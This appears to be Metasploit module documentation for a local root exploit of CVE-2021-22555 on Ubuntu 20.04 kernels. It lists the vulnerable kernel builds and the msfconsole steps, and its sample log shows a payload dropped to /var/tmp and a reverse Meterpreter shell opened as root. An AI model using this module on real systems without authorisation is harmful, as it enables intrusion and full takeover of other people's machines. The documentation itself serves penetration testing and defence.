## Description

This module attempts to gain root privileges on Linux systems with a vulnerable Ubuntu kernel.

## Vulnerable Application
CVE-2021-22555 takes advantage of a heap out-of-bounds write when memset() is called, allowing for messages in the MSGMNI queue to reference a pointer that has been written by the exploit, resulting in code execution.  

Tested on Ubuntu 20.04:
- 5.8.0-53-generic #60~20.04.1-Ubuntu
- 5.8.0-50-generic #56~20.04.1-Ubuntu
- 5.8.0-49-generic #55~20.04.1-Ubuntu
- 5.8.0-48-generic #54~20.04.1-Ubuntu
- 5.8.0-29-generic #31~20.04.1-Ubuntu
- 5.8.0-28-generic #30~20.04.1-Ubuntu
- 5.8.0-25-generic #26~20.04.1-Ubuntu
- 5.8.0-23-generic #24~20.04.1-Ubuntu

## Verification Steps
1. Start `msfconsole`
2. Get a session
3. `use exploit/linux/local/netfilter_xtables_heap_oob_write_priv_esc`
4. `set SESSION [SESSION]`
5. `check`
6. `run`
7. You should get a new _root_ session

## Options
### SESSION

Which session to use, which can be viewed with sessions

### WritableDir

A writable directory file system path. (default: /var/tmp)

### CmdTimeout

How long to wait for a reply when executing commands on the remote system
The vulnerability was discovered by Andy Nguyen [@theflow0](https://twitter.com/theflow0).

## Scenarios
```
msf6 exploit(linux/local/netfilter_xtables_heap_oob_write_priv_esc) > run

[*] Started reverse TCP handler on 192.168.1.145:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Target is running kernel release 5.8.0-48-generic.
[*] Dropping pre-compiled binaries to system...
[*] Writing '/var/tmp/flTJOaqhI' (734660 bytes) ...
[*] Uploading payload...
[*] Writing '/var/tmp/ckaFBkiL' (250 bytes) ...
[*] Running payload on remote system...
[*] Sending stage (3012548 bytes) to 192.168.1.67
[+] Deleted /var/tmp/flTJOaqhI
[+] Deleted /var/tmp/ckaFBkiL
[*] Meterpreter session 2 opened (192.168.1.145:4444 -> 192.168.1.67:43322) at 2021-09-28 14:20:41 +0100
[*] Payload executed!

meterpreter > getuid
Server username: root @ ubuntu-virtual-machine (uid=0, gid=0, euid=0, egid=0)
```

In the case of receiving an error, the user can retry the exploit unless the message queue on the target has been exhausted. In that case, the system needs to be rebooted for the exploit to work again.
